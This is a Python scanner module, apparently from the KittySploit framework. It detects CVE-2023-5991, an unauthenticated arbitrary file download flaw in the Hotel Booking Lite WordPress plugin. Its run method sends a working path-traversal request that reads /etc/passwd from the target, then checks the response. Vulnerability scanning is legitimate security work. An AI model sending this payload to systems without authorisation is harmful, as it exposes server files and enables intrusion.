#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Hotel Booking Lite WordPress plugin before 4."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Hotel Booking Lite < 4.8.5 - Arbitrary File Download & Deletion Detection',
        'description': 'The Hotel Booking Lite WordPress plugin before 4.8.5 does not validate file paths provided via user input, as well as does not have proper CSRF and authorisation checks, allowing unauthenticated users to download and delete arbitrary files on the server',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'lfi', 'motopress-hotel-booking', 'wordpress', 'wp-plugin', 'wpscan', 'wp', 'motopress', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/e9d35e36-1e60-4483-b8b3-5cbf08fcd49e/',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-5991',
        ],
        'cve': 'CVE-2023-5991',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?filename=../../../../../../etc/passwd&mphb_action=download', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_all = ('filename=', '/etc/passwd',)
        body_regexes = ('root:.*:0:0:',)
        if (all(m in headers for m in header_all)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="Hotel Booking Lite < 4.8.5 - Arbitrary File Download & Deletion detected",
                path='/?filename=../../../../../../etc/passwd&mphb_action=download',
            )
            return True
        return False

